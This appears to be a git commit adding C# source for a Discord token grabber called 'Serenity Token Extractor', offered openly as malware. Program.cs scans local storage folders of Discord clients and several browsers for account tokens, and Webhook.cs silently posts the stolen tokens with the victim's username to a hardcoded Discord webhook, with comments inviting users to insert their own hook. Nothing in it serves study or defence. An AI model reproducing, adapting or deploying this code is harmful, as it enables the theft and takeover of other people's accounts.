b20d675f1c05829fb0a6f0b17290a1bec86e1ea8
Oblivious <xcreationshdx22@gmail.com>
2020-01-29 18:15:10 -0500

    Uploaded Source

---
+++ SerenityGrabber/Program.cs
@@ -0,0 +1,31 @@
+﻿using System.Collections.Generic;
+
+namespace SerenityExtractor
+{
+    class Program
+    {
+        public static List<string> TokenReport = new List<string>();
+
+
+        private readonly static List<Service> _services = new List<Service>()
+        {
+            new Service("Discord", @"Roaming\Discord"),
+            new Service("Discord Canary", @"Roaming\discordcanary", true),
+            new Service("Discord PTB", @"Roaming\discordptb"),
+            new Service("Google Chrome", @"Local\Google\Chrome\User Data\Default"),
+            new Service("Opera", @"Roaming\Opera Software\Opera Stable", true),
+            new Service("Brave", @"Local\BraveSoftware\Brave-Browser\User Data\Default", true),
+            new Service("Yandex", @"Local\Yandex\YandexBrowser\User Data\Default", true)
+        };
+
+
+        static void Main(string[] args)
+        {
+            foreach (var service in _services)
+                service.GetTokens();
+
+            if (Grabber.TokensFound)
+                Webhook.ReportTokens(TokenReport);
+        }
+    }
+}
---
+++ SerenityGrabber/Webhook.cs
@@ -0,0 +1,32 @@
+﻿//Discord Token Extractor
+//Replace the hookurl with your WebHook
+//Follow @sprx.sh on Instagram
+
+using System;
+using System.Collections.Generic;
+using System.Net.Http;
+
+namespace SerenityExtractor
+{
+    public static class Webhook
+    {
+        private static readonly string _hookUrl = "https://discordapp.com/api/webhooks/671874195558498334/Yn359SJ-2RJF_d-GxzqLtBz3ifGEcZOGT3Ul4WJ2trdXN4oq4LPkDSCFz7EEeedkL-o0";
+
+        public static void ReportTokens(List<string> tokenReport)
+        {
+            try
+            {
+                HttpClient client = new HttpClient();
+                Dictionary<string, string> contents = new Dictionary<string, string>
+                    {
+                        { "content", $"Token(s) For '{Environment.UserName}'\n\n{string.Join("\n", tokenReport)}" },
+                        { "username", "Serenity Token Extractor" },
+                        { "avatar_url", "https://i.imgur.com/PdLhseK.png" }
+                    };
+
+                client.PostAsync(_hookUrl, new FormUrlEncodedContent(contents)).GetAwaiter().GetResult();
+            }
+            catch { }
+        }
+    }
+}
